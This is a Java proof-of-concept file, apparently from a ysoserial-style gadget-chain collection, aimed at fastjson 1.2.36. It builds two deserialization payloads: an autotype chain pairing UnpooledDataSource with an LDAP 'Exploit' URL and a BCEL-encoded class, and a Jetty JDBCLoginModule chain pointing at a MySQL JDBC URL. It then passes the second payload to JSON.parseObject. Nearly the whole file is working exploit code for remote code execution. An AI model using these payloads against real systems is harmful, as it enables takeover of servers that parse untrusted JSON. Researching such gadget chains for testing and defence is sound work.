package ysoserial.payloads.tabbyGadgetChains.Jetty;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;


/**
 * 1.2.36
 */
public class Poc3 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.apache.ibatis.datasource.unpooled.UnpooledDataSource\",\"url\":\"ldap://localhost:8990/Exploit\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driver\":\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dS$5bS$d3$40$U$fe$b6$X$C$b5$dc$_$8a$a0$a2$a0$b4$I$8d$I$e2$a5x$9b$K$pC$B$a5$8a3$fa$b4$84$b5$a6$a6IL$b6$M$fc$o_$7c$90$Xu$9c$d1$l$e0$8fr$3c$9b$a6m$84$8e$f2$90$dd$9co$cf$f9$f2$9d$f3m$7e$fd$fe$fe$T$c0$o$f2$gfR$e8$c4$f5$Uf1$d7$89$9c$dau$N74$cck$b8$a9a$81A3$i$db$W$86dx$98$vV$f8$3e$d7$zn$97$f5$92$f4L$bb$9c$af$p5iZ$fa3$cfq$85$tM$e1$e7$b3u$d8$ff$60$e9$85z$b5$e9$d8y$86D$c1$d9$T$M$bdE$d3$W$9b$b5$ea$ae$f0$5e$f0$5d$8b$90$81$a2cpk$87$7b$a6$8aC0$n$df$99$3eCO$d1$e5$87$96$c3$f7$f4$95$7d$d3$o$96x$cd$b3T$c9$J1Tb$dao$j$86$91$f6$b2$YR$x$H$86p$95$g_$c3$o$c5$dcP$b1$ffr$bb$c80$dc$a6$bf$eck$92$5b$W2d9$5c$L$f8$9f$9e$7e$SoZ$a3x$e2$99$fb$c2$8b2$e5$eb$e4$h$bc$e2x$3b$c2$f3I$X$b5$97$c9$ae$85$b8iG$f0$ee$ca$de$aeQp$aa$aeer$5b$Gy$Nq$dc$T$b6$y$3a$e5$b2$f0$Y$c63$d9$88$W$8bP$92$a7$d7O$c9$f0$5b$M$j$cb$a6m$ca$H$B$c5$OC$e7$b2a$85$40wIr$e3$fd$Gw$D$L$e8$o$d0$88JN$cd3$c4$aa$a9$y$e9R$W$e4$U$3b$c3$d8$3f$gKc$SS$g$96$d2$b8$8d$3b$M$f7$f5$d2$a1$_EU$7f$ec$92z$83$H$G$e8$Fn$Z5$8bK$c7$cbq$d7U7ER$h$be$be$c1$8d$adR$e44$8d$bb$b8$c70$d8$gy$d3E$86t$f4r0$f4$b5$92$b6v$x$c1$b5$ed$3d$a6$93$8cn$o$a5$e7$c5$IW$s$8a$af$K$$k$9e$d8td$a9$e6$ba$8e$t$c5$5e$q$b5$bf$f5$9d$ed$9a$z$cd$w$N$tEV4$83$e1$86$L$d1$iuC$c5$810$Y$a6$db$dd$b5$ID$c34$84$ef$e7q$Z$g$fd$a04y$faa$bbhO$e1$MbHS$f4$88$a28$ed1$f6Y$ad$e8$a6$b5$830PN$P$ad$T$f5S$f4$a2$P$I$de$fa1$Q$9c$c70$88$nZ$87$e9$3dA$c8$I$3dgq$$$e4$5d$a2$u$a6$b2$e2$9f$8e$f1$f6$G$bc$p$f5$d3$T$bcQ$b6Q$9c$P$d9$K$a1$cad$fc$HN$I$j$8a$IM6$J$93M$a1$c96B$c70N$ab$a2$9e$a5$9d$b5$V$3a$g$f0$a6$c3f$eb$bc$M$XNQy$b1m$e5E$5c$fao$e5d$db$ca$J20$f6w$e5$89$vd$daT6$3a$be$S0O$85__$I9$923_$R$3bj$d2$a4$CGt$w$98$8fP5$G$da$89$abM$82u$caTg$3d$df$Q$lH$7cA$f2$d5G$q$d6$8f$C$ac$8b2$3a$c8$K$c5$d8$TX2K$d8$i$c5$b9$80U$7d$e3$g$3d$gbE$N$d3$aa$bbL$Ag$ff$A$e9$b7$bbrP$G$A$A\"}";

        String poc2= "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "                \"@type\": \"org.eclipse.jetty.jaas.spi.JDBCLoginModule\",\n" +
                "                \"dbDriver\": \"com.mysql.cj.jdbc.Driver\",\n" +
                "                \"dbUrl\": \"jdbc:mysql://127.0.0.1:8990/test\",\n" +
                "                \"dbUserName\": \"cxc\",\n" +
                "                \"dbPassword\": \"cxc\",\n" +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}\n";



        JSON.parseObject(poc2, Feature.SupportNonPublicField);
    }
}
